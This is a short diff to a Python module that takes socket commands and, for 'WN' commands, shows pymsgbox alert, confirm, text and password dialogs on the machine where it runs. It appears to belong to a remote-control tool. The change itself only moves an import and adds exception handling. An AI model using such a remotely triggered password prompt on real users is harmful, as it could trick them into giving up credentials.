@@ -1,9 +1,9 @@
 import socket
-from pymsgbox import alert, confirm, prompt, password
 from time import sleep
 
 
 def popup(conn: socket.socket, command: str) -> None:
+    from pymsgbox import alert, confirm, prompt, password
     parts = command.strip().split("|")
     if len(parts) < 2:
         return
@@ -26,9 +26,12 @@ def popup(conn: socket.socket, command: str) -> None:
 def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
     while True:
         sleep(0.25)
-        if command.startswith("WN"):
-            popup(conn, command)
-            conn.send(b"END")
-            break
-        else:
+        try:
+            if command.startswith("WN"):
+                popup(conn, command)
+                conn.send(b"END")
+                break
+            else:
+                break
+        except Exception:
             break
